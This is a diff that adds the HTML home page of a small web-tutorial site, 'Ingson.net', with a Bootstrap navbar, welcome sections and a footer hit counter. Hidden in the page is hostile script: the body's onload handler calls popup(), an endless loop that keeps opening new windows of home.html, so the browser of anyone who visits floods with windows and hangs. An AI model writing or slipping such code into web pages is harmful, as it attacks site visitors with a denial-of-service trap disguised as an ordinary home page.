@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Home</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
+  <link href="http://fonts.googleapis.com/css?family=Montserrat" rel="stylesheet">
+  <link href="fonts.css" rel="stylesheet" />
+  <link rel="apple-touch-icon-precomposed" sizes="57x57" href="favicon.ico" />
+  <link rel='shortcut icon' href='favicon.ico' type='image/x-icon'/ > 
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.0/jquery.min.js"></script>
+  <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <style>
+  body {
+      font: 20px Montserrat, sans-serif;
+      line-height: 1.8;
+      color: #f5f6f7;
+  }
+  p {font-size: 16px;}
+  .margin {margin-bottom: 45px;}
+  .bg-1 { 
+      background-color: #4863A0; /* Green */
+      color: #ffffff;
+  }
+  .bg-2 { 
+      background-color: #474e5d; /* Dark Blue */
+      color: #ffffff;
+  }
+  .bg-3 { 
+      background-color: #ffffff; /* White */
+      color: #555555;
+  }
+  .bg-4 { 
+      background-color: #2f2f2f; /* Black Gray */
+      color: #fff;
+  }
+  .container-fluid {
+      padding-top: 70px;
+      padding-bottom: 70px;
+  }
+  .navbar {
+      padding-top: 15px;
+      padding-bottom: 15px;
+      border: 0;
+      border-radius: 0;
+      margin-bottom: 0;
+      font-size: 12px;
+      letter-spacing: 5px;
+  }
+  .navbar-nav  li a:hover {
+      color: #4863A0 !important;
+  }
+  </style>
+  <link rel="shortcut icon" href="favicon.ico" />
+</head>
+<body onload="popup()">
+<script type="text/javascript">
+
+var i = 0;
+function popup(){
+for (;;) {
+  cuteLittleWindow = window.open("home.html", "littleWindow" + (new Date().getTime()), "location=no,width=320,height=200"); }
+}
+
+</script>
+
+
+<!-- Navbar -->
+<nav style="width: 100%;" class="navbar navbar-inverse affix" data-spy="affix" data-offset-top="0">
+  <div class="container">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>                        
+      </button>
+      <a class="navbar-brand" href="home.html">INGSON.NET</a>
+    </div>
+    <div class="collapse navbar-collapse" id="myNavbar" >
+      <ul class="nav navbar-nav navbar-right">
+        <li><a href="home.html">HOME</a></li>
+        <li><a href="news.html">SOCIAL</a></li>
+        <li><a href="contact.php">CONTACT</a></li>
+	<li><a href="about/about.html">ABOUT</a></li>
+	<li><a href="http://games.ingson.net/">GAMES</a></li>
+      </ul>
+    </div>
+  </div>
+</nav>
+
+
+<!-- First Container -->
+<div class="container-fluid bg-1 text-center">
+  <h3 class="margin">WELCOME</h3>
+  <img src="typi.GIF" class="img-responsive img-circle margin" style="display:inline" alt="Bird" width="450" height="350">
+  <h3>To the newly designed Ingson.net</h3>
+</div>
+
+<!-- Second Container -->
+<div class="container-fluid bg-2 text-center">
+  <h3 class="margin">INGSON.NET</h3>
+  <p>Ingson.net exists to provide information and a learning experience for HTML, CSS, JAVASCRIPT, PHP,  MySQL, and more.</p>
+  <!--
+  <a href="#" class="btn btn-default btn-lg">
+    <span class="glyphicon glyphicon-search"></span> Search
+  </a>-->
+</div>
+
+<!-- Third Container (Grid) -->
+<div class="container-fluid bg-3 text-center">    
+  <h3 class="margin">WHAT NEXT?</h3><br>
+  <div class="row">
+    <div class="col-sm-4">
+      <p>VISIT SOCIAL MEDIA:</p>
+	  <a href="news.html">
+      <img src="twitter.png" class="img-responsive margin" style="width:100%" alt="Image"></a>
+    </div>
+    <div class="col-sm-4"> 
+      <p>CONTACT US:</p>
+	  <a href="contact.php">
+      <img src="contact.jpg" class="img-responsive margin" style="width:100%" alt="Image"></a>
+    </div>
+    <div class="col-sm-4"> 
+      <p>VISIT ABOUT:</p>
+	  <a href="about/about.html">
+      <img src="about.png" class="img-responsive margin" style="width:100%" alt="Image"></a>
+    </div>
+  </div>
+</div>
+
+<!-- Footer -->
+<footer class="container-fluid bg-4 text-center">
+  <p>© Content copyright 2016. ingson.net. All rights reserved. 3/13/16 <a href="mailto:contact@ingson.net">contact@ingson.net</a>
+<center><table cellpadding="0" width="87" border="0" cellspacing="0"><tr><td width="87" height="30"><a target='_blank' href=><img height="30" alt="" width="87" src=http://www.imgserver.org/snootyV.jpg border="0"></a></td></tr><tr><td height="18"><a href=http://www.free-counter-plus.com/ target='_blank'><img height="18" alt="http://www.free-counter-plus.com" border="0" width="52" src=http://www.imgserver.org/bluejay0.gif></a><a href=http://www.free-counter-plus.com/counter/stats/stats.asp?id=555564546 target='_blank'><img src=http://www.imgserver.org/staph0.jpg height="18" border="0" width="35" alt=""></a></td></tr><tr align='center'><td height="16" colspan="2"></td></tr></table></center></p>
+</footer>
+
+
+</body>
+</html>
